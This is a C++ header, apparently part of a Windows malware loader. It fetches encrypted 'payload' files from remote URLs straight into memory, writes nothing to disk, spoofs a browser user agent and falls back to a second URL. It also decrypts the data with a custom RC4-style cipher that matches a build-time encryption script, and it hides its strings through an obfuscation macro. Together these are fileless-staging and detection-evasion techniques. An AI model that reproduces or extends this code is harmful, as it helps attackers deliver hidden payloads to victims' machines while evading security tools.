#pragma once
/*
 * mem_payload.h - Download files directly to memory (no disk),
 * with optional XOR encryption/decryption.
 */
#include <windows.h>
#include <wininet.h>
#include <vector>
#include <string>
#include "string_crypt.h"
#pragma comment(lib, "wininet.lib")

namespace MemPayload {

// Custom stream cipher — S-box based, 4-round key schedule, position-dependent mixing.
// Must match custom_stream_encrypt() in encrypt_build.py exactly.
// Symmetric: same function encrypts and decrypts (keystream XOR).
inline void StreamCrypt(std::vector<uint8_t>& data, const uint8_t* key, size_t keyLen) {
    // Initialize S-box (permutation table)
    uint8_t S[256];
    for (int x = 0; x < 256; x++) S[x] = (uint8_t)x;

    // Key scheduling — 4 rounds of S-box shuffling
    uint8_t j = 0;
    for (int rnd = 0; rnd < 4; rnd++) {
        for (int x = 0; x < 256; x++) {
            j = j + S[x] + key[(x + rnd) % keyLen];
            uint8_t tmp = S[x]; S[x] = S[j]; S[j] = tmp;
        }
    }

    // Generate keystream and crypt
    uint8_t ii = 0;
    j = 0;
    for (size_t n = 0; n < data.size(); n++) {
        ii = ii + 1;
        j = j + S[ii];
        uint8_t tmp = S[ii]; S[ii] = S[j]; S[j] = tmp;
        uint8_t k = S[(uint8_t)(S[ii] + S[j])];
        k ^= (uint8_t)((n * 0x9E) & 0xFF);  // Position-dependent mixing
        data[n] ^= k;
    }
}

// Download a URL directly into a memory buffer (zero disk writes).
inline bool DownloadToMemory(const std::string& url, std::vector<uint8_t>& outBuffer) {
    outBuffer.clear();

    std::string ua = E("Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
    HINTERNET hInet = InternetOpenA(ua.c_str(), INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);
    if (!hInet) return false;

    HINTERNET hUrl = InternetOpenUrlA(hInet, url.c_str(), nullptr, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_PRAGMA_NOCACHE, 0);
    if (!hUrl) {
        InternetCloseHandle(hInet);
        return false;
    }

    uint8_t buf[8192];
    DWORD bytesRead = 0;
    while (InternetReadFile(hUrl, buf, sizeof(buf), &bytesRead) && bytesRead > 0) {
        outBuffer.insert(outBuffer.end(), buf, buf + bytesRead);
    }

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInet);

    return outBuffer.size() > 1024; // Minimum sanity check
}

// Download with fallback URL
inline bool DownloadToMemoryWithFallback(const std::string& primaryUrl,
                                          const std::string& fallbackUrl,
                                          std::vector<uint8_t>& outBuffer) {
    if (DownloadToMemory(primaryUrl, outBuffer))
        return true;
    return DownloadToMemory(fallbackUrl, outBuffer);
}

} // namespace MemPayload
